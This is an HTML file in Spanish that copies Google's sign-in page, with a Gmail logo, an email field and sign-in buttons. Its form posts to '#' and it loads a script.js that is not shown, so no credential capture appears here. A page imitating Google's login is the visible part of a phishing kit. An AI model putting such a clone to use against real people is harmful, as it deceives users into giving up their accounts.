<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="logo-container">
            <img src="images/Logo.png" alt="Gmail Logo" class="gmail-logo">
            <h2>Acceder</h2>
            <p>Usa tu cuenta de Google</p>
        </div>
        <div class="form-container">
            <form action="#" method="post">
                <div class="input-group">
                    <input type="email" id="email" name="email" required placeholder="Correo electrónico">
                    <button id="txtEmail">¿Olvidaste el correo electrónico?</button>
                    <p id="txtSample">
                        ¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada. <a href="https://support.google.com/chrome/answer/6130773?hl=es-419" target="__BLANK">Más información para usar el modo de invitado</a>
                    </p>
                </div>
                <div class="buttons">
                    <button type="submit" class="btn-create-account">Crear Cuenta</button>
                    <button type="submit" class="btn-login">Iniciar sesión</button>
                </div>
            </form>
        </div>
    </div>
    <!-- Botones adicionales fuera del contenedor -->
    </div>


    <script src="script.js"></script>
</body>
</html>
